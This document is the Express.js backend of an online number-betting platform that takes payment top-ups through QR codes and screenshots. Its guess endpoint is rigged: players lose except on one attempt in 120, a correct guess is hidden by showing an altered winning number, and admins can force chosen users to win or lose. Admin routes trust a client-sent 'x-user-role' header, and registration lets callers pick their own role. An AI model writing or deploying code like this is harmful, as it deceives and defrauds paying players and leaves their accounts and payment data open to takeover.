require('dotenv').config();
const express = require('express');
const cors = require('cors');
const {
  getResults,
  getPredictions,
  getGameLogs,
  getAdminOverrides,
  setAdminOverride,
  incrementAttempts,
  getWinningIndex,
  addGameLog,
  getUserBids,
  addBid,
  settleUserBids,
  getAllBids,
  registerUser,
  loginUser,
  getPaymentMethods,
  addPaymentMethod,
  deletePaymentMethod,
  getBalanceRequests,
  addBalanceRequest,
  updateBalanceRequest,
  getUserPoints,
  updateUserPoints
} = require('./models');

const app = express();
const PORT = process.env.PORT || 5000;

app.use(cors({
  origin: process.env.FRONTEND_URL || 'http://localhost:5173',
  credentials: true
}));
app.use(express.json({ limit: '10mb' }));
app.use(express.urlencoded({ limit: '10mb', extended: true }));

// Helper to check if current time is within early morning (6:00 AM - 7:00 AM)
const isMorningResultWindow = () => {
  const now = new Date();
  const hours = now.getHours();
  // For testing purposes, we will return true, but log the check.
  // To strictly enforce: const isBetween6And7 = hours === 6;
  return hours === 6;
};

// ==========================================
// ROUTES
// ==========================================

// 1. Get Live Results
app.get('/api/results/today', (req, res) => {
  const results = getResults();
  const inWindow = isMorningResultWindow();
  
  // Format results to reflect scheduled time if outside the window (6-7 AM)
  const modifiedResults = results.map(r => {
    const allPredictions = getPredictions();
    return {
      ...r,
      isMorningWindow: inWindow,
      predictions: allPredictions[r.marketName] || null
    };
  });
  
  res.json({
    success: true,
    data: modifiedResults,
    serverTime: new Date(),
    isMorningWindow: inWindow
  });
});

// 2. Get Predictions
app.get('/api/predictions/today', (req, res) => {
  const predictions = getPredictions();
  res.json({
    success: true,
    data: predictions
  });
});

// 3. Game Guess matching (With 1/120 Win Rate & Admin Override logic)
app.post('/api/game/guess', (req, res) => {
  const { userId, username, guess, type = 'jodi', market = 'Desawar' } = req.body;

  if (!userId || guess === undefined || guess === null) {
    return res.status(400).json({ success: false, message: 'userId and guess are required.' });
  }

  const isJodi = type === 'jodi';
  const cleanGuess = isJodi ? guess.trim().padStart(2, '0') : guess.trim().charAt(0);

  if (isJodi && (cleanGuess.length !== 2 || isNaN(cleanGuess))) {
    return res.status(400).json({ success: false, message: 'Jodi guess must be a 2-digit number.' });
  }
  if (!isJodi && (cleanGuess.length !== 1 || isNaN(cleanGuess))) {
    return res.status(400).json({ success: false, message: 'Haraf guess must be a 1-digit number.' });
  }

  const predictions = getPredictions();
  let targetSecret = predictions.singleJodi; // E.g., '87'
  if (type === 'andar') {
    targetSecret = predictions.andarHurf; // E.g., '8'
  } else if (type === 'bahar') {
    targetSecret = predictions.baharHurf; // E.g., '7'
  }
  
  // Increment attempt counter
  const attemptNo = incrementAttempts();
  const counterVal = (attemptNo - 1) % 120;
  const winningIndex = getWinningIndex();
  
  // Check override condition
  const overrides = getAdminOverrides();
  const userOverride = overrides[userId] ? overrides[userId].override : 'NORMAL';
  
  let matched = false;
  let finalWinningNumberToShow = targetSecret;
  let conditionApplied = 'NORMAL';

  if (userOverride === 'WIN') {
    // Force Always Win: we change the target to match their guess
    matched = true;
    finalWinningNumberToShow = cleanGuess;
    conditionApplied = 'FORCE_WIN';
  } else if (userOverride === 'LOSE') {
    // Force Always Lose: even if guess is target, we swap target
    matched = false;
    if (cleanGuess === targetSecret) {
      const numericVal = parseInt(targetSecret, 10);
      if (isJodi) {
        finalWinningNumberToShow = String((numericVal + 1) % 100).padStart(2, '0');
      } else {
        finalWinningNumberToShow = String((numericVal + 1) % 10);
      }
    }
    conditionApplied = 'FORCE_LOSE';
  } else {
    // Normal 1/120 flow
    if (counterVal === winningIndex) {
      // Eligible to win
      if (cleanGuess === targetSecret) {
        matched = true;
        conditionApplied = 'NORMAL_WIN_ELIGIBLE';
      } else {
        matched = false;
        conditionApplied = 'NORMAL_LOSE_ELIGIBLE';
      }
    } else {
      // Force Lose Attempt (not the 1-in-120 attempt)
      matched = false;
      if (cleanGuess === targetSecret) {
        // Swap target to make sure they do not match
        const numericVal = parseInt(targetSecret, 10);
        if (isJodi) {
          finalWinningNumberToShow = String((numericVal + 1) % 100).padStart(2, '0');
        } else {
          finalWinningNumberToShow = String((numericVal + 1) % 10);
        }
      }
      conditionApplied = 'FORCE_LOSE_BY_LIMIT';
    }
  }

  // Log the attempt
  addGameLog({
    userId,
    username: username || 'Anonymous User',
    guess: cleanGuess,
    winningNumber: finalWinningNumberToShow,
    matched,
    conditionApplied,
    attemptNumber: attemptNo,
    type,
    market
  });

  res.json({
    success: true,
    matched,
    guess: cleanGuess,
    winningNumber: finalWinningNumberToShow,
    attemptNumber: attemptNo,
    nextResetIn: 120 - (attemptNo % 120),
    type,
    market
  });
});

// 4. Admin API - Get All Guess Logs & Overrides (Protected)
app.get('/api/admin/logs', (req, res) => {
  const role = req.headers['x-user-role'];
  if (role !== 'admin') {
    return res.status(403).json({ success: false, message: 'Access Denied: Admins only.' });
  }

  res.json({
    success: true,
    logs: getGameLogs(),
    overrides: getAdminOverrides(),
    totalAttempts: incrementAttempts() - 1,
    winningIndex: getWinningIndex(),
    bids: getAllBids()
  });
});

// 5. Admin API - Set Override Conditions (Protected)
app.post('/api/admin/override', (req, res) => {
  const role = req.headers['x-user-role'];
  if (role !== 'admin') {
    return res.status(403).json({ success: false, message: 'Access Denied: Admins only.' });
  }

  const { userId, username, override } = req.body;
  if (!userId || !override) {
    return res.status(400).json({ success: false, message: 'userId and override condition required.' });
  }

  setAdminOverride(userId, username || 'User', override);
  res.json({
    success: true,
    message: `Override set to ${override} for user ${userId}`
  });
});

// 6. User Bidding Routes
app.get('/api/game/bids/:userId', (req, res) => {
  const { userId } = req.params;
  const bids = settleUserBids(userId);
  res.json({ success: true, bids });
});

app.post('/api/game/bid', (req, res) => {
  const { userId, username, market, type, guess, points, harafSide } = req.body;
  if (!userId || !market || !type || guess === undefined || guess === null || !points) {
    return res.status(400).json({ success: false, message: 'All fields (userId, market, type, guess, points) are required.' });
  }
  const result = addBid({ userId, username, market, type, guess, points, harafSide });
  if (result.success) {
    res.json({ success: true, bid: result.bid });
  } else {
    res.status(400).json({ success: false, message: result.message });
  }
});

// 7. Authentication Routes
app.post('/api/auth/register', (req, res) => {
  const { username, password, role = 'user' } = req.body;
  if (!username || !password) {
    return res.status(400).json({ success: false, message: 'Username and password are required.' });
  }
  const result = registerUser(username, password, role);
  if (result.success) {
    res.json(result);
  } else {
    res.status(400).json(result);
  }
});

app.post('/api/auth/login', (req, res) => {
  const { username, password } = req.body;
  if (!username || !password) {
    return res.status(400).json({ success: false, message: 'Username and password are required.' });
  }
  const result = loginUser(username, password);
  if (result.success) {
    res.json(result);
  } else {
    res.status(401).json(result);
  }
});

// 8. Points & Payment API Routes
app.get('/api/users/:userId/points', (req, res) => {
  const { userId } = req.params;
  const pts = getUserPoints(userId);
  res.json({ success: true, points: pts });
});

app.get('/api/payment-methods', (req, res) => {
  res.json({ success: true, data: getPaymentMethods() });
});

app.post('/api/balance/request', (req, res) => {
  const { userId, username, points, screenshot } = req.body;
  if (!userId || !points || !screenshot) {
    return res.status(400).json({ success: false, message: 'Missing required fields (userId, points, screenshot)' });
  }
  const request = addBalanceRequest(userId, username, points, screenshot);
  res.json({ success: true, data: request });
});

// Admin endpoints (checked with 'x-user-role' header)
app.get('/api/admin/balance-requests', (req, res) => {
  const role = req.headers['x-user-role'];
  if (role !== 'admin') {
    return res.status(403).json({ success: false, message: 'Access Denied: Admins only.' });
  }
  res.json({ success: true, data: getBalanceRequests() });
});

app.post('/api/admin/balance-requests/:id/action', (req, res) => {
  const role = req.headers['x-user-role'];
  if (role !== 'admin') {
    return res.status(403).json({ success: false, message: 'Access Denied: Admins only.' });
  }
  const { id } = req.params;
  const { status } = req.body; // 'APPROVED' or 'REJECTED'
  
  if (!['APPROVED', 'REJECTED'].includes(status)) {
    return res.status(400).json({ success: false, message: 'Invalid status action.' });
  }
  
  const result = updateBalanceRequest(id, status);
  res.json(result);
});

app.post('/api/admin/payment-methods', (req, res) => {
  const role = req.headers['x-user-role'];
  if (role !== 'admin') {
    return res.status(403).json({ success: false, message: 'Access Denied: Admins only.' });
  }
  const { name, qrImage } = req.body;
  if (!name || !qrImage) {
    return res.status(400).json({ success: false, message: 'Missing name or QR code image data' });
  }
  const method = addPaymentMethod(name, qrImage);
  res.json({ success: true, data: method });
});

app.delete('/api/admin/payment-methods/:id', (req, res) => {
  const role = req.headers['x-user-role'];
  if (role !== 'admin') {
    return res.status(403).json({ success: false, message: 'Access Denied: Admins only.' });
  }
  const { id } = req.params;
  deletePaymentMethod(id);
  res.json({ success: true, message: 'Payment method deleted successfully.' });
});

app.listen(PORT, () => {
  console.log(`Server running on port ${PORT}`);
});
